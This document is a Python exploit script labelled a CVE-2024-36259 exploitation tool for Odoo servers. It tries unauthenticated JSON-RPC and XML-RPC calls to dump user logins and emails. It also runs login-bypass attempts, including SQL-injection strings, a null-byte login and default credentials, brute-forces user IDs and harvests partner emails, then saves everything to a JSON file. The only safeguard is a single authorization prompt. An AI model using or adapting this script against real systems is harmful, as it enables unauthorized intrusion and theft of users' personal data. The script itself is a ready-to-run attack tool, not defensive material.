#!/usr/bin/env python3
"""
CVE-2024-36259 Exploitation Tool
Attempts to extract all user data through various vulnerability vectors
"""

import requests
import sys
import json
import argparse
from datetime import datetime
from urllib.parse import urlparse
import warnings
warnings.filterwarnings("ignore")

class CVE_2024_36259_Exploit:
    """
    Exploit various Odoo vulnerabilities to extract user data
    """
    
    def __init__(self, target_url, username=None, password=None):
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.uid = None
        self.db_name = None
        self.extracted_data = []
        
    def get_database(self):
        """Get database name"""
        try:
            response = self.session.post(
                f"{self.target_url}/web/database/list",
                json={"jsonrpc": "2.0", "method": "call", "params": {}, "id": 1}
            )
            if response.status_code == 200:
                result = response.json()
                if 'result' in result and result['result']:
                    self.db_name = result['result'][0]
                    print(f"[+] Database found: {self.db_name}")
                    return True
        except:
            pass
        return False
    
    def attempt_unauthenticated_extraction(self):
        """Attempt to extract data without authentication"""
        print("\n[*] Attempting UNAUTHENTICATED data extraction...")
        
        # Try various endpoints that might leak data
        vulnerable_endpoints = [
            {
                'url': '/web/session/get_session_info',
                'data': {"jsonrpc": "2.0", "method": "call", "params": {}, "id": 1}
            },
            {
                'url': '/web/dataset/call_kw',
                'data': {
                    "jsonrpc": "2.0",
                    "method": "call",
                    "params": {
                        "model": "res.users",
                        "method": "search_read",
                        "args": [],
                        "kwargs": {"fields": ["login", "email"]}
                    },
                    "id": 1
                }
            },
            {
                'url': '/jsonrpc',
                'data': {
                    "jsonrpc": "2.0",
                    "method": "call",
                    "params": {
                        "service": "object",
                        "method": "execute",
                        "args": [self.db_name, None, None, "res.users", "search_read", [], ["login", "email"]]
                    },
                    "id": 1
                }
            }
        ]
        
        for endpoint in vulnerable_endpoints:
            print(f"  Testing {endpoint['url']}...")
            try:
                response = self.session.post(
                    f"{self.target_url}{endpoint['url']}",
                    json=endpoint['data'],
                    timeout=5
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if 'result' in result and result['result']:
                        print(f"    [!] Data leaked from {endpoint['url']}")
                        return result['result']
            except:
                pass
        
        return None
    
    def attempt_authentication_bypass(self):
        """Attempt various authentication bypass techniques"""
        print("\n[*] Attempting authentication bypass...")
        
        bypass_attempts = [
            # SQL injection in login
            {"db": self.db_name, "login": "admin' OR '1'='1' --", "password": ""},
            {"db": self.db_name, "login": "admin", "password": "' OR '1'='1' --"},
            
            # Null byte injection
            {"db": self.db_name, "login": "admin\x00", "password": ""},
            
            # Default credentials
            {"db": self.db_name, "login": "admin", "password": "admin"},
            {"db": self.db_name, "login": "demo", "password": "demo"},
            
            # Empty/null values
            {"db": self.db_name, "login": "", "password": ""},
            {"db": self.db_name, "login": None, "password": None},
        ]
        
        for attempt in bypass_attempts:
            try:
                response = self.session.post(
                    f"{self.target_url}/web/session/authenticate",
                    json={
                        "jsonrpc": "2.0",
                        "method": "call",
                        "params": attempt,
                        "id": 1
                    },
                    timeout=5
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if 'result' in result and result['result'] and result['result'].get('uid'):
                        print(f"    [!] BYPASS SUCCESSFUL with: {attempt}")
                        self.uid = result['result']['uid']
                        return True
            except:
                pass
        
        return False
    
    def exploit_xmlrpc_vulnerabilities(self):
        """Exploit XMLRPC interface vulnerabilities"""
        print("\n[*] Exploiting XMLRPC vulnerabilities...")
        
        # Try to execute methods without proper authentication
        xmlrpc_payloads = [
            {
                'method': 'execute',
                'params': [self.db_name, 1, '', 'res.users', 'search_read', [], ['login', 'email', 'name']]
            },
            {
                'method': 'execute_kw',
                'params': [self.db_name, 1, '', 'res.users', 'search_read', [], {'fields': ['login', 'email']}]
            }
        ]
        
        for payload in xmlrpc_payloads:
            try:
                # Try JSON-RPC format
                response = self.session.post(
                    f"{self.target_url}/jsonrpc",
                    json={
                        "jsonrpc": "2.0",
                        "method": "call",
                        "params": {
                            "service": "object",
                            "method": payload['method'],
                            "args": payload['params']
                        },
                        "id": 1
                    },
                    timeout=5
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if 'result' in result and isinstance(result['result'], list):
                        print(f"    [!] XMLRPC exploitation successful!")
                        return result['result']
            except:
                pass
        
        # Try XML format
        xml_payload = """<?xml version='1.0'?>
<methodCall>
    <methodName>execute</methodName>
    <params>
        <param><value><string>{}</string></value></param>
        <param><value><int>1</int></value></param>
        <param><value><string></string></value></param>
        <param><value><string>res.users</string></value></param>
        <param><value><string>search</string></value></param>
        <param><value><array><data></data></array></value></param>
    </params>
</methodCall>""".format(self.db_name)
        
        try:
            response = self.session.post(
                f"{self.target_url}/xmlrpc/object",
                data=xml_payload,
                headers={'Content-Type': 'text/xml'},
                timeout=5
            )
            
            if response.status_code == 200 and 'array' in response.text:
                print("    [!] XML-RPC exploitation might be successful")
                # Parse XML response for user IDs
                import xml.etree.ElementTree as ET
                root = ET.fromstring(response.text)
                # Extract any integer values (potential user IDs)
                user_ids = []
                for int_elem in root.findall('.//int'):
                    user_ids.append(int(int_elem.text))
                
                if user_ids:
                    print(f"    [!] Found user IDs: {user_ids}")
                    return self.get_user_details_by_ids(user_ids)
        except:
            pass
        
        return None
    
    def get_user_details_by_ids(self, user_ids):
        """Try to get user details for specific IDs"""
        users = []
        
        for uid in user_ids:
            # Try various methods to get user info
            try:
                response = self.session.post(
                    f"{self.target_url}/web/dataset/call_kw",
                    json={
                        "jsonrpc": "2.0",
                        "method": "call",
                        "params": {
                            "model": "res.users",
                            "method": "read",
                            "args": [[uid], ["login", "email", "name"]],
                            "kwargs": {}
                        },
                        "id": 1
                    },
                    timeout=5
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if 'result' in result and result['result']:
                        users.extend(result['result'])
            except:
                pass
        
        return users
    
    def brute_force_user_ids(self):
        """Brute force user IDs to find all users"""
        print("\n[*] Attempting to brute force user IDs...")
        
        found_users = []
        # Common user ID ranges in Odoo
        id_ranges = [
            range(1, 100),      # System and initial users
            range(1000, 1100),  # Portal users often start here
            range(5000, 5100),  # Employee users
        ]
        
        for id_range in id_ranges:
            for user_id in id_range:
                try:
                    # Try to get user info without authentication
                    response = self.session.post(
                        f"{self.target_url}/web/dataset/call",
                        json={
                            "jsonrpc": "2.0",
                            "method": "call",
                            "params": {
                                "model": "res.users",
                                "method": "name_get",
                                "args": [[user_id]],
                                "kwargs": {},
                                "context": {}
                            },
                            "id": 1
                        },
                        timeout=2
                    )
                    
                    if response.status_code == 200:
                        result = response.json()
                        if 'result' in result and result['result']:
                            print(f"    [!] Found user ID {user_id}: {result['result']}")
                            found_users.append({
                                'id': user_id,
                                'data': result['result']
                            })
                except:
                    pass
        
        return found_users
    
    def exploit_partner_model(self):
        """Try to get user emails through partner model"""
        print("\n[*] Attempting to extract emails via res.partner...")
        
        try:
            # Partners are often less restricted than users
            response = self.session.post(
                f"{self.target_url}/web/dataset/call_kw",
                json={
                    "jsonrpc": "2.0",
                    "method": "call",
                    "params": {
                        "model": "res.partner",
                        "method": "search_read",
                        "args": [[["email", "!=", False]]],  # All partners with emails
                        "kwargs": {
                            "fields": ["name", "email", "is_company", "user_ids"],
                            "limit": 1000
                        }
                    },
                    "id": 1
                },
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                if 'result' in result and result['result']:
                    partners = result['result']
                    print(f"    [!] Found {len(partners)} partners with emails")
                    
                    # Extract user-related partners
                    user_partners = [p for p in partners if p.get('user_ids')]
                    if user_partners:
                        print(f"    [!] {len(user_partners)} partners are linked to user accounts")
                        return user_partners
        except Exception as e:
            print(f"    [-] Failed: {str(e)[:50]}")
        
        return []
    
    def generate_report(self, all_data):
        """Generate comprehensive report"""
        print("\n" + "="*60)
        print("EXPLOITATION RESULTS")
        print("="*60)
        
        # Combine and deduplicate all found data
        unique_users = {}
        
        for dataset in all_data:
            if isinstance(dataset, list):
                for item in dataset:
                    if isinstance(item, dict):
                        # Extract user info
                        user_id = item.get('id') or item.get('user_ids', [None])[0]
                        email = item.get('email')
                        login = item.get('login')
                        name = item.get('name')
                        
                        if user_id or email:
                            key = f"{user_id}_{email}" if user_id else email
                            if key not in unique_users:
                                unique_users[key] = {
                                    'id': user_id,
                                    'login': login or email,  # Often login = email
                                    'email': email,
                                    'name': name
                                }
        
        if unique_users:
            print(f"\n[!] SUCCESSFULLY EXTRACTED {len(unique_users)} UNIQUE USERS/EMAILS")
            print("\n" + "-"*60)
            print(f"{'ID':<8} {'Login/Email':<35} {'Name':<25}")
            print("-"*60)
            
            for user in unique_users.values():
                print(f"{str(user.get('id', 'N/A')):<8} {(user.get('login') or user.get('email', 'N/A'))[:34]:<35} {(user.get('name', 'N/A'))[:24]:<25}")
            
            # Save to file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"extracted_users_{timestamp}.json"
            
            with open(filename, 'w') as f:
                json.dump({
                    'target': self.target_url,
                    'database': self.db_name,
                    'timestamp': datetime.now().isoformat(),
                    'users': list(unique_users.values())
                }, f, indent=2)
            
            print(f"\n[+] Data saved to: {filename}")
        else:
            print("\n[-] No additional users could be extracted")
            print("    The target appears to be properly secured")
            print("    Only your own user account is accessible")

def main():
    parser = argparse.ArgumentParser(description='CVE-2024-36259 Exploitation Tool')
    parser.add_argument('target', help='Target Odoo URL')
    parser.add_argument('-u', '--username', help='Username (optional)')
    parser.add_argument('-p', '--password', help='Password (optional)')
    
    args = parser.parse_args()
    
    # Clean URL
    target = args.target
    parsed = urlparse(target)
    if parsed.path in ['/web/login', '/web', '/']:
        target = f"{parsed.scheme}://{parsed.netloc}"
    
    print("\n" + "="*60)
    print("CVE-2024-36259 EXPLOITATION TOOL")
    print("="*60)
    
    confirm = input(f"\n[!] Do you have authorization to test {target}? (yes/no): ")
    if confirm.lower() != 'yes':
        sys.exit(1)
    
    exploit = CVE_2024_36259_Exploit(target, args.username, args.password)
    
    if not exploit.get_database():
        print("[-] Could not get database name")
        return
    
    all_extracted_data = []
    
    # Try various exploitation methods
    data = exploit.attempt_unauthenticated_extraction()
    if data:
        all_extracted_data.append(data)
    
    if exploit.attempt_authentication_bypass():
        print("[!] Authentication bypass successful!")
    
    data = exploit.exploit_xmlrpc_vulnerabilities()
    if data:
        all_extracted_data.append(data)
    
    data = exploit.brute_force_user_ids()
    if data:
        all_extracted_data.append(data)
    
    data = exploit.exploit_partner_model()
    if data:
        all_extracted_data.append(data)
    
    # Generate report
    exploit.generate_report(all_extracted_data)

if __name__ == "__main__":
    main()